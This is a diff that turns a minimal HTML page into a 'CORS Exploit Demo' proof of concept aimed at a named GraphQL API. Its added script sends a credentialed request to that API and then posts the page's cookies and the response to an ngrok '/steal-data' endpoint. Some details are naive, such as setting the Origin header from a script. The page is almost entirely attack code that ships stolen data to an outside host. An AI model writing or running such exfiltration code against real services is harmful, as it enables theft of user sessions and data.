@@ -1,15 +1,34 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit Demo</title>
+</head>
 <body>
+    <h1>Demonstration of CORS Exploit</h1>
     <script>
+        // Make a request to the vulnerable API
         fetch('https://api.consumer.worldcoin.org/v1/graphql', {
-            method: 'GET',
-            credentials: 'include',
+            method: 'POST',
+            credentials: 'include',  // Include user cookies in the request
             headers: {
-                'Origin': 'https://kripto-geek.github.io/crossdomain-poc/'
-            }
+                'Content-Type': 'application/json',
+                'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/'  // Set your domain
+            },
+            body: JSON.stringify({ query: `{ publicData { id name } }` })  // Example query
         })
         .then(response => response.text())
-        .then(data => console.log(data));
+        .then(data => {
+            // Send the cookies and response data to your server for demonstration
+            fetch('https://644a-2401-4900-1c82-da4e-c470-a27-bb8b-2114.ngrok.io/steal-data', {
+                method: 'POST',
+                body: JSON.stringify({ cookies: document.cookie, response: data }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+        });
     </script>
 </body>
 </html>
